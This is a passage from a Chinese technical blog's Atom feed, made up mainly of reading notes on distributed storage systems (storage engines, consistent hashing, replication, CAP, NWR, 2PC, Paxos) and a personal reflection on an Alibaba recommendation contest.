&lt;li&gt;&lt;a href=&quot;http://javarevisited.blogspot.com/2012/12/how-to-create-thread-safe-singleton-in-java-example.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;How to create thread safe Singleton in Java&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://javarevisited.blogspot.com/2011/03/10-interview-questions-on-singleton.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;10 Singleton Pattern Interview questions in Java&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      单例模式算是设计模式中最容易理解，也是最容易手写代码的模式了吧。但是其中的坑却不少，所以也常作为面试题来考。本文主要对几种单例写法的整理，并分析其优缺点。很多都是一些老生常谈的问题，但如果你不知道如何创建一个线程安全的单例，不知道什么是双检锁，那这篇文章可能会帮助到你。
    
    </summary>
    
      <category term="程序设计" scheme="http://wuchong.me/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    
      <category term="Singleton" scheme="http://wuchong.me/tags/Singleton/"/>
    
      <category term="多线程" scheme="http://wuchong.me/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
      <category term="设计模式" scheme="http://wuchong.me/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
      <category term="双检锁" scheme="http://wuchong.me/tags/%E5%8F%8C%E6%A3%80%E9%94%81/"/>
    
  </entry>
  
  <entry>
    <title>分布式存储系统 知识体系</title>
    <link href="http://wuchong.me/blog/2014/08/07/distributed-storage-system-knowledge/"/>
    <id>http://wuchong.me/blog/2014/08/07/distributed-storage-system-knowledge/</id>
    <published>2014-08-07T06:25:56.000Z</published>
    <updated>2016-03-08T12:08:44.000Z</updated>
    
    <content type="html">&lt;p&gt;最近看完了杨传辉老师写的《大规模分布式存储系统》一书，发现里面很多知识点和之前看的《大型网站系统与Java中间件》有很多相通之处，也渐渐加深了我对分布式技术的兴趣。但无奈分布式涵盖范围太广了，分布式存储、分布式计算、CAP理论、Paxos算法、什么GFS、Hadoop、Dynamo、BigTable、Spanner等等，不下点功夫还真不能理顺它们之间的内在关系。所以结合两书以及一些优秀博文，总结了分布式存储的知识体系，为以后打下基础而努力。由于初入泥潭，必然有些理解不当的地方，若有大神路过还望不吝指教。&lt;/p&gt;
&lt;p&gt;本文更像是读书笔记，是对知识点的一个梳理，无奈越写越多，部分知识只能点到为止，具体内容可以查看原书或维基百科。&lt;/p&gt;
&lt;h2 id=&quot;单机存储引擎&quot;&gt;&lt;a href=&quot;#单机存储引擎&quot; class=&quot;headerlink&quot; title=&quot;单机存储引擎&quot;&gt;&lt;/a&gt;单机存储引擎&lt;/h2&gt;&lt;h3 id=&quot;哈希&quot;&gt;&lt;a href=&quot;#哈希&quot; class=&quot;headerlink&quot; title=&quot;哈希&quot;&gt;&lt;/a&gt;哈希&lt;/h3&gt;&lt;p&gt;哈希存储引擎是哈希表的持久化实现，支持增、删、改，以及随机读取操作，但不支持顺序扫描，对应的存储系统为键值(Key-Value)存储系统，如 Bitcask。它仅支持追加操作，删除也只是通过标识 value 为特殊值，通过定期合并（Compaction）实现垃圾回收。&lt;/p&gt;
&lt;h3 id=&quot;B-树&quot;&gt;&lt;a href=&quot;#B-树&quot; class=&quot;headerlink&quot; title=&quot;B 树&quot;&gt;&lt;/a&gt;B 树&lt;/h3&gt;&lt;p&gt;B 树存储引擎是 B 树的持久化实现，不仅支持单条记录的增、删、读、改操作，还支持顺序扫描，对应的存储系统是关系数据库。关系数据库中通过索引访问数据，在 Mysql InnoDB 中，有一个称为聚集索引的东西，行的数据存于其中，组织成 B+ 树的结构。更多 B 系树的内容可以参考 &lt;a href=&quot;http://taop.marchtea.com/03.02.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这里&lt;/a&gt; 。&lt;/p&gt;
&lt;h3 id=&quot;LSM-树&quot;&gt;&lt;a href=&quot;#LSM-树&quot; class=&quot;headerlink&quot; title=&quot;LSM 树&quot;&gt;&lt;/a&gt;LSM 树&lt;/h3&gt;&lt;p&gt;LSM 树(Log Structure Merge Tree)存储引擎采用批量转储技术来避免磁盘随机写入。其思想很朴素，就是将对数据的修改增量保持在内存中，达到指定的大小限制后将这些修改操作批量写入磁盘。它广泛应用于互联网的后台存储系统， 例如 Google BigTable、 以及 Facebook 开源的 Cassandra系统。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;分布式存储的出现&quot;&gt;&lt;a href=&quot;#分布式存储的出现&quot; class=&quot;headerlink&quot; title=&quot;分布式存储的出现&quot;&gt;&lt;/a&gt;分布式存储的出现&lt;/h2&gt;&lt;p&gt;单机存储随着业务的增长会遇到&lt;strong&gt;性能&lt;/strong&gt;与&lt;strong&gt;单点故障&lt;/strong&gt;问题。通常有两种解决方案：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;数据分布：就是把数据分块存在不同的服务器上（分库分表）。&lt;/li&gt;
&lt;li&gt;数据复制：让所有的服务器都有相同的数据，提供相当的服务。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这两种方法都能解决性能上的问题，一般结合使用。而对于数据丢失的问题，我们只能通过第二种方法来完成——数据的冗余存储。但是加入更多的机器，会导致事情变得复杂起来，尤其是分布式事务处理，也就是多台服务器之间的数据如何保持一致性，因为原先单机的 ACID 特性在分布式环境下都用不了了。&lt;/p&gt;
&lt;h3 id=&quot;数据分布&quot;&gt;&lt;a href=&quot;#数据分布&quot; class=&quot;headerlink&quot; title=&quot;数据分布&quot;&gt;&lt;/a&gt;数据分布&lt;/h3&gt;&lt;p&gt;数据分布主要有两种方式：一种是哈希分布，如一致性哈希（Dynamo）；另一种是顺序分布（BigTable）。考虑因素包括读写场景， 即随机还是顺序， 包括如何保证负载均衡从而提高性能等&lt;/p&gt;
&lt;p&gt;传统的哈希分布算法简单的将哈希值与服务器个数做除法取模映射。但是当服务器上下线时，数据的重新分布会带来大量的数据迁移。&lt;/p&gt;
&lt;p&gt;因此有了 &lt;strong&gt;&lt;a href=&quot;http://zh.wikipedia.org/zh-cn/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;一致性哈希算法&lt;/a&gt;&lt;/strong&gt; 。算法思想如下 :给系统中每个节点分配一个随机 token，这些 token 构成一个哈希环。执行数据存放操作时，先计算 Key(主键)的哈希值，然后存放到顺时针方向第一个大于或者等于该哈希值的 token 所在的节点。一致性哈希的优点在于节点加入 / 删除时只会影响到在哈希环中相邻的节点，而对其他节点没影响。增加节点后能很大程度上避免了数据迁移。为了考虑负载均衡，一般还会引入虚拟节点的技术，即一个物理节点会对应着多个虚拟节点（如 Dynamo）。&lt;/p&gt;
&lt;h3 id=&quot;数据复制&quot;&gt;&lt;a href=&quot;#数据复制&quot; class=&quot;headerlink&quot; title=&quot;数据复制&quot;&gt;&lt;/a&gt;数据复制&lt;/h3&gt;&lt;p&gt;复制协议有两种：&lt;strong&gt;强同步复制&lt;/strong&gt;，&lt;strong&gt;异步复制&lt;/strong&gt;。 区别在于用户的写请求是否需要同步到备副本才可以返回成功。&lt;/p&gt;
&lt;p&gt;一致性和可用性是矛盾的。强同步复制协议保证主备副本之间的一致性，但是当备副本出现故障时会影响系统可用性。异步复制协议的可用性较好，但是一致性得不到保障，主副本出现故障时还有数据丢失的可能。&lt;/p&gt;
&lt;p&gt;这两种协议都是将主副本的数据以某种形式（多为操作日志）发送到其他副本，这种复制协议称为基于主副本的复制协议。当然还有基于多个存储节点的复制协议。比如下面会介绍的 Dynamo 系统的 NWR 复制协议。&lt;/p&gt;
&lt;h3 id=&quot;故障检测&quot;&gt;&lt;a href=&quot;#故障检测&quot; class=&quot;headerlink&quot; title=&quot;故障检测&quot;&gt;&lt;/a&gt;故障检测&lt;/h3&gt;&lt;p&gt;设计分布式系统的前提就是假定服务器时刻肯能发生故障。故障检测主要有心跳和租约两种机制。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;心跳：假设总控机 A 需要确认工作机 B 是否发生故障，那么总控机 A 每隔一段时间，比如 1 秒，向工作机 B 发送一个心跳包。不足之处是若 A 到 B 网络发生故障，则不能确定是否是 B 不再提供服务。&lt;/li&gt;
&lt;li&gt;租约：租约机制就是带有超时时间的一种授权。假设机器 A 需要检测机器 B 是否发生故障，机器 A 可以给机器 B 发放租约，机器 B 持有的租约在有效期内才允许提供服务，否则主动停止服务。机器 B 的租约快要到期的时候向机器 A 重新申请租约。租约机制可以解决上述心跳问题的不足。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;一致性模型&quot;&gt;&lt;a href=&quot;#一致性模型&quot; class=&quot;headerlink&quot; title=&quot;一致性模型&quot;&gt;&lt;/a&gt;一致性模型&lt;/h2&gt;&lt;p&gt;说起数据一致性，简单说有三种类型（细分会有很多，此处不展开）：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;弱一致性（Weak）&lt;/strong&gt;：当你写入一个新值后，读操作在各个数据副本上不保证能读出最新值。比如：某些cache系统，网络游戏其它玩家的数据和你没什么关系。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;最终一致性（Eventually）&lt;/strong&gt;：Eventually 是 Weak 的一种特殊情况。当你写入一个新值后，有可能读不出来，但在某个时间窗口之后保证最终能读出来。比如：DNS，电子邮件、Amazon S3，Google搜索引擎这样的系统。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;强一致性（Strong）&lt;/strong&gt;：新的数据一旦写入，在任意副本任意时刻都能读到新值。比如：文件系统，RDBMS，Azure Table都是强一致性的。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;从这三种一致型的模型上来说，我们可以看到，Weak 和 Eventually 一般来说是异步冗余的，而Strong一般来说是同步冗余的，异步的通常意味着更好的性能，但也意味着更复杂的状态控制。同步意味着简单，但也意味着性能下降。&lt;/p&gt;
&lt;h2 id=&quot;分布式事务&quot;&gt;&lt;a href=&quot;#分布式事务&quot; class=&quot;headerlink&quot; title=&quot;分布式事务&quot;&gt;&lt;/a&gt;分布式事务&lt;/h2&gt;&lt;p&gt;事务的支持对于业务是非常重要的特性，数据库在单机下的 ACID 事务特性是比较到位的，而一旦进行分库分表后就要面对一致性和可用性的问题了，这就是分布式事务了。&lt;/p&gt;
&lt;h3 id=&quot;CAP-原理&quot;&gt;&lt;a href=&quot;#CAP-原理&quot; class=&quot;headerlink&quot; title=&quot;CAP 原理&quot;&gt;&lt;/a&gt;CAP 原理&lt;/h3&gt;&lt;p&gt;在分布式环境下需要考虑数据的一致性和性能的问题，我们要了解下 &lt;a href=&quot;http://zh.wikipedia.org/wiki/CAP%E5%AE%9A%E7%90%86&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CAP 理论&lt;/a&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一致性：所有节点在同一时间具有相同的数据。&lt;/li&gt;
&lt;li&gt;可用性：保证每个请求不管成功或者失败都有响应。我理解的是系统的性能。&lt;/li&gt;
&lt;li&gt;分区容忍性：系统中任意信息的丢失或失败不会影响系统的继续运作。我理解的是系统的抗故障能力。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在分布式系统中，对于这三者不能同时满足。这就是 CAP 理论。&lt;/p&gt;
&lt;p&gt;简单地说就是：&lt;br&gt;1）要想让数据避免单点故障，就得写多份数据。&lt;br&gt;2）写多份的问题会导致数据一致性的问题。&lt;br&gt;3）数据一致性的问题又会引发性能问题&lt;/p&gt;
&lt;h3 id=&quot;NWR-模型&quot;&gt;&lt;a href=&quot;#NWR-模型&quot; class=&quot;headerlink&quot; title=&quot;NWR 模型&quot;&gt;&lt;/a&gt;NWR 模型&lt;/h3&gt;&lt;p&gt;NWR是一种在分布式存储系统中用于控制一致性级别的策略，应用于 Amazon Dynamo。NWR 模型将 CAP 的选择权交给了用户，由用户自己选择 CAP 中的哪两个。其中，N 代表 N 个备份，W 代表至少写 W 份才认为成功，R 代表至少要读 R 份才认为成功。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果 W+R&amp;gt;N ，是可以保证强一致性的。因为 W+R &amp;gt; N， 所以 R &amp;gt; N-W，什么意思呢？就是读取的份数必须要大于未成功写的份数，这样至少能读到一份最新值。&lt;/li&gt;
&lt;li&gt;如果 W+R&amp;lt;=N，则能够保证最终一致性。&lt;/li&gt;
&lt;li&gt;如果我们要高可写的环境，我们可以配置 W=1 R=N。这个时候只要写任何节点成功就认为成功，但是读的时候必须从所有的节点都读出数据。&lt;/li&gt;
&lt;li&gt;如果我们要求读的高效率，我们可以配置 W=N R=1。这个时候任何一个节点读成功就认为成功，但是写的时候必须写所有三个节点成功才认为成功。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;两阶段提交&quot;&gt;&lt;a href=&quot;#两阶段提交&quot; class=&quot;headerlink&quot; title=&quot;两阶段提交&quot;&gt;&lt;/a&gt;两阶段提交&lt;/h3&gt;&lt;p&gt;英文 Two Phase Commit，也叫 2PC。两阶段提交经常用于分布式事务，是强一致性算法。简要的说就是分两阶段：&lt;/p&gt;
&lt;p&gt;第一阶段，主控节点（协调者）询问所有节点（参与者）是否可以提交操作，参与者回应 yes or no。&lt;br&gt;第二阶段，协调者根据收到的响应，如果所有参与者都回应 yes，则向所有参与者发送“正式提交”的命令。参与者完成后恢复“完成”消息，协调者收集齐各节点的回应后结束这个 Global Transaction。如果有一个拒绝则给所有参与者发送“回滚操作”。参与者回滚成功后回应“回滚完成”，协调者收集各结点的“回滚”回应后，取消这个 Global Transaction。&lt;/p&gt;
&lt;p&gt;2PC说白了就是第一阶段做 Vote，第二阶段做决定的一个算法，相对于单库事务来说就是在提交之前多了准备的阶段。但是也存在着问题，其中一个是同步阻塞操作，这个事情必然会非常大地影响性能。另一个主要的问题是在TimeOut上。因此出现了 3PC，主要是将提交过程分为两步，更多描述见 &lt;a href=&quot;http://en.wikipedia.org/wiki/Three-phase_commit_protocol&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Wikipedia&lt;/a&gt;。&lt;/p&gt;
&lt;h3 id=&quot;Paxos-算法&quot;&gt;&lt;a href=&quot;#Paxos-算法&quot; class=&quot;headerlink&quot; title=&quot;Paxos 算法&quot;&gt;&lt;/a&gt;Paxos 算法&lt;/h3&gt;&lt;p&gt;Google Chubby 的作者 Mike Burrows 说过，“世上只有一种一致性算法，那就是 Paxos”，所有其他一致性算法都是Paxos算法的残次版本。&lt;/p&gt;
&lt;p&gt;Paxos是一个分布式选举算法， 最大的用途就是保持多个节点数据的一致性。看了好久的 Paxos 算法还是有些迷糊，这里就不给出具体算法了。感兴趣的可以参看 &lt;a href=&quot;http://zh.wikipedia.org/zh/Paxos%E7%AE%97%E6%B3%95&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;WikiPedia&lt;/a&gt; 以及里面给出的示例。&lt;/p&gt;
&lt;p&gt;实际上对于一般的开发人员，我们并不需要了解 Paxos 所有细节及如何实现，只需要知道 Paxos 是一个分布式选举算法就够了。当我们以后遇到相似的问题，知道有这样一个技术，可以正确及优雅地解决技术架构上一些难题就够了。&lt;/p&gt;
&lt;h3 id=&quot;小结&quot;&gt;&lt;a href=&quot;#小结&quot; class=&quot;headerlink&quot; title=&quot;小结&quot;&gt;&lt;/a&gt;小结&lt;/h3&gt;&lt;p&gt;Paxos 协议和 2PC 协议在分布式系统中所起的作用并不相同。Paxos 协议用于保证同一个数据分片的多个副本之间的数据一致性。当这些副本分布到不同的数据中心时，这个需求尤其强烈。2PC 协议用于保证属于多个数据分片上的操作的原子性。这些数据分片可能分布在不同的服务器上，2PC 协议保证多台服务器上的操作要么全部成功，要么全部失败。可见 Paxos 的学术地位不一般。&lt;/p&gt;
&lt;p&gt;Paxos 协议有两种用法:一种用法是用它来实现全局的锁服务或者命名和配置服务，例如 Google Chubby 以及 Apache Zookeeper 还有全局ID。另外一种用法是用它来将用户数据复制到多个数据中心，例如 Google Megastore 以及 Google Spanner。&lt;/p&gt;
&lt;p&gt;2PC 协议最大的缺陷在于无法处理协调者宕机问题。如果协调者宕机，那么，2PC协议中的每个参与者可能都不知道事务应该提交还是回滚，整个协议被阻塞，执行过程中申请的资源都无法释放。因此，常见的做法是将 2PC 和 Paxos 协议结合起来，通过2PC 保证多个数据分片上的操作的原子性，通过 Paxos 协议实现同一个数据分片的多个副本之间的一致性。另外，通过 Paxos 协议解决 2PC 协议中协调者宕机问题。当 2PC协议中的协调者出现故障时，通过 Paxos 协议选举出新的协调者继续提供服务。&lt;/p&gt;
&lt;p&gt;下图是几种策略原理的比较，来源于：Google App Engine的 co-founder Ryan Barrett在2009年的google i/o上的演讲《&lt;a href=&quot;http://snarfed.org/transactions_across_datacenters_io.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Transaction Across DataCenter&lt;/a&gt;》（&lt;a href=&quot;http://www.youtube.com/watch?v=srOgpXECblk&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;视频&lt;/a&gt;）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/mw690/81b78497jw1ej3xmerc23j20ss0cstd8.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;图中 M/S 是 &lt;a href=&quot;http://en.wikipedia.org/wiki/Master/slave_(technology&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Master-Slave&lt;/a&gt;) 结构，实现简单，但是存在单点故障和数据丢失的问题。M/M 即 &lt;a href=&quot;http://en.wikipedia.org/wiki/Multi-master_replication&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Multi-Master&lt;/a&gt;，解决了单点故障但是一致性的实现较复杂且存在冲突合并的问题（Vector Clock解决）。从上图我们可以看到，我们基本上来说不可以让所有的项都绿起来，也就是之前说到的著名的CAP理论：一致性，可用性，分区容忍性，你只可能要其中的两个。&lt;/p&gt;
&lt;h2 id=&quot;分布式系统分类&quot;&gt;&lt;a href=&quot;#分布式系统分类&quot; class=&quot;headerlink&quot; title=&quot;分布式系统分类&quot;&gt;&lt;/a&gt;分布式系统分类&lt;/h2&gt;&lt;h3 id=&quot;分布式文件系统&quot;&gt;&lt;a href=&quot;#分布式文件系统&quot; class=&quot;headerlink&quot; title=&quot;分布式文件系统&quot;&gt;&lt;/a&gt;分布式文件系统&lt;/h3&gt;&lt;p&gt;分布式文件系统用于存储 Blob 对象，典型的系统有 Facebook Haystack 以及 Taobao File System(TFS)。分布式文件系统是分布式的基石，通常作为上层系统的底层存储。&lt;/p&gt;
&lt;p&gt;总体上看，分布式文件系统存储三种类型的数据 :Blob 对象、定长块以及大文件。在系统实现层面，分布式文件系统内部按照数据块(chunk)来组织数据，每个 chunk 的大小大致相同，每个 chunk 可以包含多个 Blob 对象或者定长块，一个大文件也可以拆分为多个 chunk 。&lt;/p&gt;
&lt;h3 id=&quot;分布式键值系统&quot;&gt;&lt;a href=&quot;#分布式键值系统&quot; class=&quot;headerlink&quot; title=&quot;分布式键值系统&quot;&gt;&lt;/a&gt;分布式键值系统&lt;/h3&gt;&lt;p&gt;分布式键值系统用于存储关系简单的半结构化数据，它只提供基于主键的 CRUD(Create/Read/Update/Delete)功能。&lt;/p&gt;
&lt;p&gt;典型的系统有 Amazon Dynamo 以及 Taobao Tair。从数据结构的角度看，分布式键值系统与传统的哈希表比较类似，不同的是，分布式键值系统支持将数据分布到集群中的多个存储节点。分布式键值系统是分布式表格系统的一种简化实现，一般用作缓存，比如淘宝 Tair 以及 Memcache。一致性哈希是分布式键值系统中常用的数据分布技术。&lt;/p&gt;
&lt;h3 id=&quot;分布式表格系统&quot;&gt;&lt;a href=&quot;#分布式表格系统&quot; class=&quot;headerlink&quot; title=&quot;分布式表格系统&quot;&gt;&lt;/a&gt;分布式表格系统&lt;/h3&gt;&lt;p&gt;分布式表格系统用于存储关系较为复杂的半结构化数据。分布式表格系统以表格为单位组织数据，每个表格包括很多行，通过主键标识一行，支持根据主键的 CRUD 功能以及范围查找功能。&lt;/p&gt;
&lt;p&gt;典型的系统包括 Google Bigtable 以及 Megastore，Microsoft Azure Table Storage，Amazon DynamoDB 等。在分布式表格系统中，同一个表格的多个数据行也不要求包含相同类型的列，适合半结构化数据。&lt;/p&gt;
&lt;h3 id=&quot;分布式数据库&quot;&gt;&lt;a href=&quot;#分布式数据库&quot; class=&quot;headerlink&quot; title=&quot;分布式数据库&quot;&gt;&lt;/a&gt;分布式数据库&lt;/h3&gt;&lt;p&gt;分布式数据库一般是从单机关系数据库扩展而来，用于存储结构化数据。分布式数据库采用二维表格组织数据，提供 SQL 关系查询语言，支持多表关联，嵌套子查询等复杂操作，并提供数据库事务以及并发控制。&lt;/p&gt;
&lt;p&gt;典型的系统包括 MySQL 数据库分片(MySQL Sharding)集群，Amazon RDS 以及Microsoft SQL Azure。分布式数据库支持的功能最为丰富，符合用户使用习惯，但可扩展性往往受到限制。当然，这一点并不是绝对的。Google Spanner 的扩展性就达到了全球级，它不仅支持丰富的关系数据库功能，还能扩展到多个数据中心的成千上万台机器。除此之外，阿里巴巴 OceanBase  也是一个支持自动扩展的分布式关系数据库。&lt;/p&gt;
&lt;h2 id=&quot;摘录&quot;&gt;&lt;a href=&quot;#摘录&quot; class=&quot;headerlink&quot; title=&quot;摘录&quot;&gt;&lt;/a&gt;摘录&lt;/h2&gt;&lt;p&gt;书中有很多对于分布式的观点对我启发很大，将之引用如下。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;“Google的分布式存储系统一步步地从 Bigtable 到 Megastore，再到 Spanner，这也验证了分布式技术和传统关系数据库技术融合的必然性，即底层通过分布式技术实现可扩展性，上层通过关系数据库的模型和接口将系统的功能暴露给用户。” OceanBase 正是看准了这两种技术融合的必然性，才走向了可扩展的关系数据库道路。
　　 &lt;/li&gt;
&lt;li&gt;&lt;p&gt;“简单就是美。系统开发过程中，如果某个方案很复杂，一般是实践者没有想清楚。”。关于这一点其实很早就听说过，就像贯穿UNIX哲学的KISS原则（Keep It Simple,Stupid），而作者通过开发复杂的分布式存储系统过程中得出这么宝贵经验，是“简单就是美”最好的注解。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;中心化 VS 去中心。“主流的分布式系统一般都带有中心节点，这样能够简化设计，而且中心节点只维护少量元数据，一般不会成为性能瓶颈。在实践中 Dynamo 及其开源实现 Cassandra 受到的关注逐渐减少，去中心的设计短期内难以成为主流。”&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; class=&quot;headerlink&quot; title=&quot;参考资料&quot;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;杨传辉 :&lt;a href=&quot;http://book.douban.com/subject/25723658/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;大规模分布式存储系统&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;酷壳：&lt;a href=&quot;http://coolshell.cn/articles/10910.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;分布式系统的事务处理&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      最近看完了杨传辉老师写的《大规模分布式存储系统》一书，发现里面很多知识点和之前看的《大型网站系统与Java中间件》有很多相通之处，也渐渐加深了我对分布式技术的兴趣。但无奈分布式涵盖范围太广了，分布式存储、分布式计算、CAP理论、Paxos算法、什么GFS、Hadoop、Dynamo、BigTable、Spanner等等，不下点功夫还真不能理顺它们之间的内在关系。所以结合两书以及一些优秀博文，总结了分布式存储的知识体系，为以后打下基础而努力。
    
    </summary>
    
      <category term="分布式系统" scheme="http://wuchong.me/categories/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="分布式" scheme="http://wuchong.me/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
      <category term="2PC" scheme="http://wuchong.me/tags/2PC/"/>
    
      <category term="Paxos" scheme="http://wuchong.me/tags/Paxos/"/>
    
      <category term="NWR" scheme="http://wuchong.me/tags/NWR/"/>
    
  </entry>
  
  <entry>
    <title>阿里推荐大赛：写给这五个月</title>
    <link href="http://wuchong.me/blog/2014/07/30/ali-bigdata-competition-write-to-the-5-monthes/"/>
    <id>http://wuchong.me/blog/2014/07/30/ali-bigdata-competition-write-to-the-5-monthes/</id>
    <published>2014-07-30T04:16:45.000Z</published>
    <updated>2014-12-22T16:18:37.000Z</updated>
    
    <content type="html">&lt;p&gt;今天早上出完成绩后，其实不怎么想写这篇文章的。因为五个月的努力，最终也没能证明自己。虽然已经不需要前 50 的「校招绿色通道」，但是心里还是会有一些失落。自己劝慰自己「毕竟是一个人单挑」，可是前 50 单挑的也不少。想想还是自己有很多的不足之处，在最终跑融合集的时候，两次脚本参数跑错导致浪费了宝贵的线上机会。而在删除集方面的尝试终于有些效果了，比赛却戛然而止了。&lt;/p&gt;
&lt;p&gt;其实在早上看到最终成绩的时候，心情还是比较平静的，我貌似已经淡定地接受了这一切。静静地看着这五个月来的一幕幕如潮水般涌来。&lt;/p&gt;
&lt;p&gt;第一次听说这个比赛是在 13 年下半年，一次偶然的机会看到 @得福 做的一次天猫推荐的分享，在那次分享的最后介绍了今年3月份会举办面向高校的推荐大赛。很期待阿里也要举办类似 Netflix 的比赛，而且这次是真正的大数据。&lt;/p&gt;
&lt;p&gt;果然在3月初的时候，比赛如期而至，毫不犹豫地报名了。因此也展开了黑白颠倒的五个月。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;在报名之初，对于没什么机器学习底子的自己，完全不知道能走多远。第一季报名的队伍如洪水般泛滥，黑科技也层出不穷，摸着石子过河的我完全找不到方向，一度处在一千名开外的位置。后来渐渐找到方法挺进了第二季。&lt;/p&gt;
&lt;p&gt;在第二季刚开放的最初几天，迫不及待地进入天池系统一睹真正的大数据。5.7 亿条真实行为记录，1250 万位用户，以及 3 万种品牌。海量的数据跑在 ODPS 平台上，真的非常佩服 ODPS 的技术，处理上亿条的数据秒秒钟的事。当然一开始大家都用的比较温柔，所以比较快，而到最后疯狂的七天也算是体验到什么叫龟速了。ODPS 是一个伟大的产品，因为他不同于以往的 PaaS 、SaaS 服务，ODPS 是一个直接面向计算的云平台。而且现在 ODPS 已经进入了水电模式，像水电一样存在了。ODPS 按照每条 SQL 指令收费，据说整个比赛的费用几乎让主办部门破产，真的非常感谢阿里能免费给我们这个学习环境。&lt;/p&gt;
&lt;p&gt;在最初的几天，新鲜感促使我迅速完成了两篇关于 ODPS 的文章，一篇 &lt;a href=&quot;http://wuchong.me/blog/2014/04/26/odps-sql-introduction/&quot;&gt;SQL 入门&lt;/a&gt; 一篇 &lt;a href=&quot;http://wuchong.me/blog/2014/04/29/odps-sql-build-offline-evaluation/&quot;&gt;离线评估构建&lt;/a&gt; 。这两篇文章帮到了很多同学，也迅速使我的博客日 UV 顺利破千，日 PV 也达到了 1600 之多。后来看到其他小伙伴分享的文章，以及群里聊天的时候，发现好多小伙伴都用的我的评估代码，包括首页的大神们，心里还是挺荣幸的。&lt;/p&gt;
&lt;p&gt;分享博客的过程中，让我认识了很多牛人，他们都是对技术有着无比热情的人，能为一个特征一个算法钻研废寝忘食的人。有一位小伙伴，聊着聊着发现我俩的家乡居然就在隔壁城市。&lt;/p&gt;
&lt;p&gt;比赛没有留给我耀眼的奖项，但留给我的远比奖项多。比赛期间的孤独无助，毫无进展，熬夜的艰苦多次让我萌生了退堂鼓的念头，但是最后还是坚持了下来，走到了最后。对自己的多次突破，让我相信人的潜力是无限的。从选手们身上对技术的追求也让我学到很多。&lt;/p&gt;
&lt;p&gt;写的有点乱，想到哪儿写到哪儿。就这样把，追寻阿里的步伐不会因此而结束，我们校招三面见。&lt;/p&gt;
&lt;p&gt;仅以此文献给那些一起拼了五个月的选手们。献给那些日子凌晨 4 点的日出。&lt;/p&gt;
&lt;p&gt;最后纪念下换数据前夕充当的华丽的分割线。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww3.sinaimg.cn/large/81b78497jw1ej0idjqiwvj20pu022mx1.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;-EOF-&lt;/p&gt;
</content>
    
    <summary type="html">
    
      今天早上出完成绩后，其实不怎么想写这篇文章的。因为五个月的努力，最终也没能证明自己。虽然已经不需要前 50 的「校招绿色通道」，但是心里还是会有一些失落。其实在早上看到最终成绩的时候，心情还是比较平静的，我貌似已经淡定地接受了这一切。静静地看着这五个月来的一幕幕如潮水般涌来。
    
    </summary>
    
      <category term="随笔生活" scheme="http://wuchong.me/categories/%E9%9A%8F%E7%AC%94%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="生活" scheme="http://wuchong.me/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="阿里推荐大赛" scheme="http://wuchong.me/tags/%E9%98%BF%E9%87%8C%E6%8E%A8%E8%8D%90%E5%A4%A7%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>全排列和全组合实现</title>
    <link href="http://wuchong.me/blog/2014/07/28/permutation-and-combination-realize/"/>
    <id>http://wuchong.me/blog/2014/07/28/permutation-and-combination-realize/</id>
    <published>2014-07-28T01:41:18.000Z</published>
    <updated>2016-03-08T12:16:28.000Z</updated>
    
